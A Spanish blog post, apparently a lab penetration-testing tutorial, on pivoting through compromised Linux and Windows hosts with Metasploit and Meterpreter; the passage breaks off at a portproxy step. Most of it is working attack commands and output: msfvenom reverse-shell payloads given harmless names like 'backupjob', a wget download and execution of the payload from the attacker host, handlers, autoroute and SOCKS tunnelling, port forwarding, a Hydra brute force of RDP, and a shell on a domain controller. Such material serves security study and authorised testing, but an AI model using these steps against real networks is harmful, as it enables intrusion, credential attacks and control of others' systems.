---
date: 2023-08-19T00:56:05.000Z
layout: post
comments: true
title: Pivoting con Metasploit
subtitle: 'Meterpreter'
description: >-
image: >-
    http://imgfz.com/i/sF9Ry5W.jpeg
optimized_image: >-
    http://imgfz.com/i/sF9Ry5W.jpeg
category: ciberseguridad
tags: 
  - hacking
  - tunneling
  - meterpreter
  - forwarding
  - port
  - tunelización
  - rdp
  - rdesktop
  - msfvenom
  - handler
  - route
  - routing
author: Felipe Canales Cayuqueo
paginate: true
---

Pivoting es una técnica que permite a los atacantes utilizar un sistema comprometido como punto de acceso intermedio o "puente" para acceder a otros sistemas en una red, especialmente si esos sistemas no son accesibles directamente desde la posición inicial del atacante. En el contexto de Metasploit y, específicamente, con la shell Meterpreter, pivoting es una funcionalidad esencial que permite a los atacantes explorar y explotar sistemas en redes a las que la máquina comprometida tiene acceso.

  1. El proceso general de pivoting con Metasploit es el siguiente:

  2. Compromiso Inicial: El atacante explota una vulnerabilidad en un sistema objetivo y obtiene una sesión de Meterpreter.

  3. Identificación de la Red: Una vez que el atacante tiene acceso al sistema, puede usar comandos dentro de Meterpreter para identificar la configuración de red y los sistemas circundantes.

  4. Configuración del Pivote: Usando Metasploit, el atacante configura un pivote a través del sistema comprometido. Esto se hace a través del comando route en Metasploit. Básicamente, este comando le dice a Metasploit que utilice la sesión de Meterpreter existente como un túnel para tráfico dirigido a una subred específica.

  5. Ataques a través del Pivote: Una vez configurado el pivote, el atacante puede lanzar módulos y explotaciones de Metasploit contra sistemas en la red objetivo utilizando el sistema comprometido como un puente.

  6. Mantener el Acceso y Limpiar Huellas: Una vez que se ha establecido el acceso, los atacantes suelen implementar técnicas para mantener ese acceso (por ejemplo, mediante el uso de payloads de persistencia) y también para limpiar cualquier huella o log que pueda indicar que el sistema ha sido comprometido.

### Direcciones IP en Redes

Cada computadora conectada a una red requiere una dirección IP para comunicarse. Sin esta dirección, esencialmente está desconectada de la red. La dirección IP puede ser asignada de dos maneras:

#### 1. **Dinámicamente**:
La mayoría de las veces, un servidor **DHCP** (Protocolo de Configuración Dinámica de Host) en la red asigna automáticamente la dirección IP. Esto es común en dispositivos que se conectan y desconectan regularmente de la red, como computadoras personales y dispositivos móviles.

#### 2. **Estáticamente**:
En algunos casos, la dirección IP se configura manualmente y no cambia con el tiempo. Este método es frecuente en dispositivos que ofrecen servicios críticos en la red. Algunos ejemplos de dispositivos que suelen tener direcciones IP estáticas son:
- Servidores
- Enrutadores
- Interfaces virtuales de switches
- Impresoras
- Otros dispositivos críticos.

Independientemente de cómo se asigne, la dirección IP se vincula a un **Controlador de Interfaz de Red (NIC)**. Este NIC, a menudo referido como _Tarjeta de Interfaz de Red_ o _Adaptador de Red_, es la pieza de hardware o software que permite a una computadora conectarse a una red.

Una característica interesante es que una sola computadora puede tener múltiples NICs, tanto físicos como virtuales. Esto significa que podría tener múltiples direcciones IP, permitiéndole estar presente en diferentes redes simultáneamente. Para un profesional de la seguridad o un atacante, identificar todas las direcciones IP de un sistema es crucial, ya que revela las diferentes redes a las que el sistema tiene acceso. Por lo tanto, es vital inspeccionar todos los NICs en un sistema utilizando comandos como `ifconfig` (en sistemas macOS y Linux) o `ipconfig` (en sistemas Windows).

### Análisis de Controladores de Interfaz de Red de `ifconfig` (NIC)

En el análisis presentado, se observa que cada NIC tiene un identificador distinto, tales como `eth0`, `eth1`, `lo` y `tun0`. Cada uno de estos identificadores está acompañado de detalles de direccionamiento y estadísticas de tráfico que gestionan.

#### Conexión VPN y el identificador `tun0`

Fijándonos en el identificador `tun0`, destaca por representar una **conexión VPN** (Red Privada Virtual). Supongamos que estamos tratando de conectarnos a un entorno de red protegido, como podría ser una red corporativa o un laboratorio virtual. Al establecer esta conexión, nuestra computadora generará una interfaz de tipo `tun0` con una dirección IP específica asignada. Esta conexión VPN es crucial para garantizar un acceso seguro y exclusivo a los recursos de esa red desde una ubicación externa. Sin esta interfaz VPN activa, simplemente no podríamos acceder a esos activos protegidos.

#### Funciones de la VPN:
1. **Encriptación del tráfico**: Asegura que la comunicación entre nosotros y la red destino sea confidencial y no pueda ser interceptada o leída por actores no autorizados.
2. **Establecimiento de un túnel**: Esta funcionalidad permite que nuestra comunicación transite a través de redes públicas (por ejemplo, Internet), pasando por sistemas de Traducción de Dirección de Red (NAT) y accediendo finalmente a la red interna o privada de interés.

### Direcciones IP en NICs

Si prestamos atención, notaremos diferentes direcciones IP vinculadas a cada NIC. Tomando como ejemplo `eth0`, con una dirección IP como `134.122.100.200`, estamos viendo una dirección IP pública. Esto implica que el tráfico proveniente o destinado a esta IP será gestionado por los Proveedores de Servicios de Internet (ISP) a través de la web. Direcciones IP públicas como esta se encuentran en dispositivos que tienen una conexión directa con Internet, a menudo situados en una Zona Desmilitarizada (DMZ).

Por otro lado, ciertos NICs, aparte de `tun0`, pueden poseer **direcciones IP privadas**. Estas direcciones operan dentro de entornos de red internos y no son accesibles directamente desde la Internet global. Para que un dispositivo se comunique en Internet, debe tener al menos una dirección IP pública en uno de sus NICs. Es esencial recordar que, en muchos casos, las direcciones IP privadas se traducen a direcciones IP públicas mediante NAT, permitiendo así la interacción con el exterior.


### Análisis de la Salida de `ipconfig` en Windows

La información proporcionada anteriormente proviene del resultado de ejecutar el comando `ipconfig` en un sistema Windows. Es evidente que este sistema posee múltiples adaptadores, aunque sólo unos pocos tienen direcciones IP asignadas. Las direcciones se presentan tanto en formatos IPv4 como IPv6. 

A pesar de los avances en la adopción de IPv6, este módulo se enfocará en redes que operan bajo IPv4. Esto se debe a que IPv4 aún domina como el principal mecanismo de direccionamiento IP en redes empresariales locales (LAN). Sin embargo, es crucial destacar que ciertos adaptadores, como los mostrados anteriormente, operan con configuraciones de **doble pila** (IPv4 e IPv6). Esta capacidad les permite acceder a recursos tanto por IPv4 como por IPv6.

#### Entendiendo la Máscara de Subred en IPv4

Cada dirección IPv4 está acompañada de una **máscara de subred**. Si consideramos la dirección IP como un número de teléfono, la máscara de subred actuaría como el código de área. Esta máscara divide la dirección IP en dos segmentos: la parte de la red y la del host. Esta distinción es vital para la comunicación en redes.

Cuando un paquete o tráfico requiere ser dirigido a una dirección IP fuera de su propia red, el sistema lo redirige a la **puerta de enlace predeterminada** (default gateway). Esta puerta de enlace, generalmente, es la dirección IP de un dispositivo que actúa como enrutador para esa LAN en particular. Desde la perspectiva de la pivotación en ciberseguridad, es esencial comprender las redes a las que un sistema comprometido puede acceder. Por ello, es de suma importancia documentar toda la información relacionada con direcciones IP durante un compromiso, ya que esto puede ser vital en fases posteriores del análisis.


## Pivoting en Linux
### Creación de payload

Primero crearemos un payload con `msfvenom`, poniendo la situación de que ya hemos tomado acceso a un activo dentro de la red.

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.49 LPORT=8080 -f elf -o backupjob         
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

> Para arquitecturas x86 sería de la siguiente forma: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.49 LPORT=8080 -f elf -o backupjob

### Configuración e inicio del multi/handler

El ```multi/handler``` se utiliza principalmente para manejar conexiones entrantes de payloads que se han ejecutado en sistemas objetivo. En términos simples, cuando un atacante envía un payload a un sistema objetivo y este payload se ejecuta, necesita "llamar a casa" o establecer una conexión con el atacante. El ```multi/handler``` es el componente de Metasploit que escucha estas conexiones entrantes y permite al atacante interactuar con la sesión establecida.

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.49
LHOST => 10.10.14.49
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.49      yes       The listen address (an interface may be specified)
   LPORT  8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.49:8080
```

> Para windows sería: set payload windows/meterpreter/reverse_tcp

### Subida y ejecución de arhivo malicioso

Procedemos a subir el payload configurado anteriormente a la máquina víctima. Pero primero nos montamos un servidor `HTTP` con python en el puerto 80 y en la carpeta en que se creó el payload.

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
┌─[victima@ubuntu]─[/tmp]
└──╼ wget http://10.10.14.49/backupjob
--2023-08-19 00:29:17--  http://10.10.14.49/backupjob
Connecting to 10.10.14.49:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/octet-stream]
Saving to: ‘backupjob’

backupjob                                                   100%[========================================================================================================================================>]     250  --.-KB/s    in 0s      

2023-08-19 00:29:17 (20.2 MB/s) - ‘backupjob’ saved [250/250]

┌─[victima@ubuntu]─[/tmp]
└──╼ chmod +x backupjob       

┌─[victima@ubuntu]─[/tmp]
└──╼ ls
backupjob
```

Ejecutamos el payload y obtenemos acceso por medio de meterpreter.

```bash
┌─[victima@ubuntu]─[/tmp]
└──╼ ./backupjob            
```

Por medio del ```multi/handler``` recibimos la sesión:

```bash
[*] Started reverse TCP handler on 10.10.14.49:8080 
[*] Sending stage (3045348 bytes) to 10.129.3.88
[*] Meterpreter session 15 opened (10.10.14.49:8080 -> 10.129.3.88:34042) at 2023-08-18 20:30:40 -0400

meterpreter > pwd
/tmp
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : ens192
Hardware MAC : 00:50:56:b9:21:25
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 10.129.3.88
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::250:56ff:feb9:2125
IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : dead:beef::250:56ff:feb9:2125
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  3
============
Name         : ens224
Hardware MAC : 00:50:56:b9:4b:8e
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.16.5.129
IPv4 Netmask : 255.255.254.0
IPv6 Address : fe80::250:56ff:feb9:4b8e
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > 

```

Nosotros accedimos por la interfaz número 2 y en este momento se detecta una tercera desde el host de la máquina víctima a la red 172.16.5.0/24. Esto nos permite realizar un barrido de ping con la herramienta de metasploit ```ping_sweep```. También podemos realizar barridos de forma manual con las siguientes opciones:

1. **Ping Sweep For Loop en hosts Linux**:

    ```bash
    for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
    ```

2. **Ping Sweep For Loop usando CMD**:

    ```cmd
    for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
    ```

3. **Ping Sweep For Loop usando powershell**:

    ```powershell
    1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
    ```

Estas son opciones que se pueden ocupar desde la máquina víctima para analizar otros activos dentro de la red que no podemos acceder, sin embargo para esta ocasión seguiremos ocupando la utilidad de metasploit.


```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24

[*] Performing ping sweep for IP range 172.16.5.0/24
[+] 	172.16.5.19 host found
[+] 	172.16.5.129 host found
             
```

En este caso encontramos un nuevo host que es el 172.16.5.19. En ciertas situaciones, el firewall de un sistema puede bloquear los pings (ICMP), lo que significa que no recibiríamos respuestas aunque el host esté activo. Frente a tales obstáculos, una alternativa es realizar un escaneo TCP en la dirección 172.16.5.0/24 utilizando Nmap.

### Configuración del proxy SOCKS de MSF (opcional)

Además, hay otras técnicas. Por ejemplo, dentro de Metasploit, podemos emplear el módulo post-explotación llamado ```socks_proxy```. Esto nos permite establecer un proxy local en nuestra máquina atacante. Específicamente, configuraríamos el proxy para usar la versión 4a de SOCKS. Al hacerlo, se iniciará un oyente en el puerto 9050, y redirigirá todo el tráfico entrante a través de nuestra sesión de Meterpreter activa.

> Le damos ```ctrl+z``` o con el comando ```bg``` a la sesión actual para dejarla en segundo plano.

```bash
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
VERSION => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a, 5)


   When VERSION is 5:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   USERNAME                   no        Proxy username for SOCKS5 listener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.

msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

Una vez que hayamos iniciado el servidor SOCKS, procederemos a configurar ```proxychains``` para que dirija el tráfico de herramientas como Nmap a través de nuestro pivote establecido en el host Ubuntu ya comprometido. Si aún no se ha realizado, podemos añadir la siguiente línea al archivo proxychains.conf. Este archivo se encuentra comúnmente en la ruta ```/etc/proxychains.conf``` o ```/etc/proxychains4.conf```.

> socks4  127.0.0.1 9050 

```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 1080
socks4  127.0.0.1 9050          
```

### Creación de rutas

Para concluir, es esencial indicar a nuestro módulo socks_proxy que dirija todo el tráfico mediante nuestra sesión en Meterpreter. Para lograrlo, utilizaremos el módulo ```post/multi/manage/autoroute``` de Metasploit. De esta forma, podremos agregar rutas para la subred 172.16.5.0 y así redirigir todo el tráfico que pase por proxychains.

```bash
msf6 auxiliary(server/socks_proxy) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > sessions -i

Active sessions
===============

  Id  Name  Type                   Information           Connection
  --  ----  ----                   -----------           ----------
  5         shell sparc/bsd                              10.10.14.49:8080 -> 10.129.3.88:33520 (10.129.3.88)
  16        meterpreter x64/linux  ubuntu @ 10.129.3.88  10.10.14.49:8080 -> 10.129.3.88:34042 (10.129.3.88)

msf6 post(multi/manage/autoroute) > set SESSION 16
SESSION => 16
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.3.88
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.4.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
              
```

Otra opción es agregar las rutas desde meterpreter de la siguiente forma:

```bash
msf6 post(multi/manage/autoroute) > sessions 16
[*] Starting interaction with 16...

meterpreter > run autoroute -s 172.16.5.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.255.0...
[+] Added route to 172.16.5.0/255.255.255.0 via 10.129.62.39
[*] Use the -p option to list all active routes
meterpreter > 

```

Listamos las rutas activas:

```bash
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 16
   172.16.4.0         255.255.254.0      Session 16
   172.16.5.0         255.255.255.0      Session 16

meterpreter >   
```

### Escaneo de puertos

Observando el resultado anterior, notamos que se ha añadido la ruta para la red 172.16.5.0/24. Con esto en marcha, ahora tenemos la capacidad de utilizar proxychains para redirigir el tráfico de Nmap a través de nuestra sesión en Meterpreter al haber aplicado anteriormente SOCKS. Sin embargo en esta ocasión seguiremos utilizando metasploit y la utilidad de ```scanner/portscan/tcp```.

> proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn (o proxychains4).

```bash
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.19
RHOSTS => 172.16.5.19
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000,1433,1723,2049,3306,3389,5900,5985,8080,8443
PORTS => 1-1000,1433,1723,2049,3306,3389,5900,5985,8080,8443
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.5.19:          - 172.16.5.19:53 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:80 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:88 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:135 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:139 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:389 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:445 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:464 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:593 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:636 - TCP OPEN
[+] 172.16.5.19:          - 172.16.5.19:3389 - TCP OPEN
[*] 172.16.5.19:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Es recomendable hacer más de un escaneo o incluso sobre el puerto 1000 ir escaneando 1 a 1 los puertos.

### Reenvío de puertos

La funcionalidad de reenvío de puertos está disponible en Meterpreter a través del módulo `portfwd`. Este módulo nos permite establecer un oyente en nuestra máquina atacante. Cuando se reciban paquetes en este puerto designado, Meterpreter se encargará de redirigirlos, a través de la sesión establecida, hacia un host específico en la red 172.16.5.0/24. Primero creamos la retransmisión TCP local.

```bash
msf6 auxiliary(scanner/portscan/tcp) > sessions 16
[*] Starting interaction with 16...

meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
[*] Forward TCP relay created: (local) :3300 -> (remote) 172.16.5.19:3389
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local             Remote        Direction
   -----  -----             ------        ---------
   1      172.16.5.19:3389  0.0.0.0:3300  Forward

1 total active port forwards.
```

Ahora podremos escanear el puerto 3389 por el 3300 de forma local de la siguiente manera:

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ nmap -sVC -p3300 localhost  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 22:59 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000053s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE       VERSION
3300/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: inlanefreight.local
|   DNS_Computer_Name: DC01.inlanefreight.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-08-19T03:00:28+00:00
| ssl-cert: Subject: commonName=DC01.inlanefreight.local
| Not valid before: 2023-08-18T01:38:48
|_Not valid after:  2024-02-17T01:38:48
|_ssl-date: 2023-08-19T03:00:30+00:00; +5s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5s, deviation: 0s, median: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.80 seconds                                                                 
```

Probamos hacer fuerza bruta con ```hydra``` sobre el rdp cuyo usuario es "victor":

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ hydra -V -f -l victor -P /usr/share/wordlists/rockyou.txt rdp://localhost:3300    
```

Procedemos a iniciar sesión con ```rdesktop``` o ```xfreerdp```, ingresando las credenciales encontradas.

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ rdesktop -u "victor" -p "pass@123" -d "INLANEFREIGHT" localhost:3300     
```

Finalmente obtenemos acceso a la máquina a través de pivoting.

[![rdpflagmeterpreterpiv](/images/rdpflagmeterpreterpiv.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/rdpflagmeterpreterpiv.png)

### Reenvío de puerto inverso

Metasploit no solo permite reenvíos de puertos locales, sino también un reenvío inverso de puertos, conocido como reverse port forwarding. Imagina que quieres que el servidor comprometido escuche en un puerto determinado y que, al recibir conexiones en ese puerto, las reenvíe directamente a tu máquina atacante. Por ejemplo, si el servidor comprometido es Ubuntu y tu máquina atacante es Windows, puedes configurar el servidor Ubuntu para reenviar las conexiones recibidas en su puerto 1234 hacia tu máquina Windows en el puerto 8081.

Para implementar esto, en el contexto de un shell ya establecido con Metasploit desde un escenario previo, podrías usar el siguiente comando.

```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.49
[*] Reverse TCP relay created: (remote) [::]:1234 -> (local) 10.10.14.49:8081             
```

Este comando instruiría al servidor Ubuntu a reenviar todas las conexiones de su puerto 1234 a tu máquina atacante en el puerto 8081. Adicionalmente, en tu máquina atacante, debes configurar un oyente con meterpreter para esperar conexiones entrantes en el puerto 8081, específicamente esperando un shell de Windows.

A continuación configuramos y ejecutamos el ```multi/handler```:

```bash
meterpreter > bg
[*] Backgrounding session 16...
msf6 auxiliary(scanner/portscan/tcp) > use exploit/multi/handler
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081
           
```

Creamos el payload considerando la IP de la máquina víctima obtenida en un principio de este modulo:

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe              
```

Para poder ejecutar el archivo en la máquina windows por RDP debemos ocupar el argumento `-r disk:linux='/home/user/pivoting'` que se utiliza para redirigir una carpeta local del sistema Unix al sistema remoto al que te estás conectando a través de RDP.

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ rdesktop -u "victor" -p "pass@123" -d "INLANEFREIGHT" localhost:3300 -r disk:linux='/home/user/pivoting'              
```

En este caso, la carpeta `/home/user/pivoting` en tu sistema local se montará en el sistema remoto a través de la sesión RDP.

Una vez que estés conectado al sistema remoto a través de RDP, normalmente verás la carpeta montada en "Mi PC" o "Este equipo" (dependiendo de la versión de Windows) con el nombre "linux" (porque especificaste `disk:linux` en el comando). De esta manera, puedes copiar archivos entre tu máquina local y el sistema remoto usando esta carpeta compartida.

[![linuxonwindows](/images/linuxonwindows.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/linuxonwindows.png)

Al abrir el archivo ```backupscript.exe```, nos devolverá una sesión meterpreter que podemos llevar a una shell, pivotado a través del servidor Ubuntu.

[![executewindowsshell](/images/executewindowsshell.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/executewindowsshell.png)

```bash
[*] Sending stage (200774 bytes) to 10.10.14.49
[*] Sending stage (200774 bytes) to 10.10.14.49
[*] Meterpreter session 18 opened (10.10.14.49:8081 -> 10.10.14.49:40035) at 2023-08-19 00:28:05 -0400

meterpreter > sysinfo
Computer        : DC01
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : 13
Meterpreter     : x64/windows
meterpreter > shell
Process 6244 created.
Channel 1 created.
'\\tsclient\linux\Pivoting'
CMD.EXE was started with the above path as the current directory.
UNC paths are not supported.  Defaulting to Windows directory.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>whoami
whoami
inlanefreight\victor

C:\Windows>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::5180:f91f:7509:47e8%7
   IPv4 Address. . . . . . . . . . . : 172.16.5.19
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::9976:89dd:628e:51d5%9
   IPv4 Address. . . . . . . . . . . : 172.16.6.19
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 

C:\Windows>
```

## Pivoting en Windows

Para el caso de Windows cambian ciertos puntos para establecer un correcto enrutamiento de la redes. Una vez tenemos nuestra sesión meterpreter establecida de la máquina Windows y detectamos una IP en la que no tenemos alcance, seguiremos los siguientes pasos para un pivoting con éxito:

```bash

meterpreter > ipconfig

Interface  1
============
Name         : Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  11
============
Name         : Adapter #0
Hardware MAC : 00:50:56:b9:21:25
MTU          : 1500
IPv4 Address : 10.129.3.88
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::dc2f:8fa1:536b:6328
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 12
============
Name         : Adapter #1
Hardware MAC : 00:50:56:b9:4b:8e
MTU          : 1500
IPv4 Address : 172.16.5.129
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::250:56ff:feb9:4b8e
IPv6 Netmask : ffff:ffff:ffff:ffff::


```

Buscamos nuevos activos en la máquina víctima con el nuevo host detectado:

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24

[*] Performing ping sweep for IP range 172.16.5.0/24
[+]     172.16.5.72 host found
[+]     172.16.5.129 host found
```


Una vez detectamos una red en la que no tenemos alcance (172.16.5.129 y 172.16.5.72), procedemos a agregar rutas en nuestra máquina para dirigir el tráfico específico a través de la sesión de meterpreter comprometida con la utilidad ```post/multi/manage/autoroute```, en donde simplemente seleccionaremos la sesión activa:

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use post/multi/manage/autoroute 
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoad
                                       d, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM         10.10.14.49:4444 -> 10.129.3.88:33520  (10.129.3.88)

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against 10.129.3.88
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.3.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.3.0         255.255.255.0      Session 1
   172.16.5.0         255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
```

Ahora utilizamos la funcionalidad "PortProxy" de Windows para redirigir el tráfico de un puerto en particular en el host interno 172.16.5.72 con la utilidad ```post/windows/manage/portproxy```:

```bash
msf6 post(multi/manage/autoroute) > use post/windows/manage/portproxy 
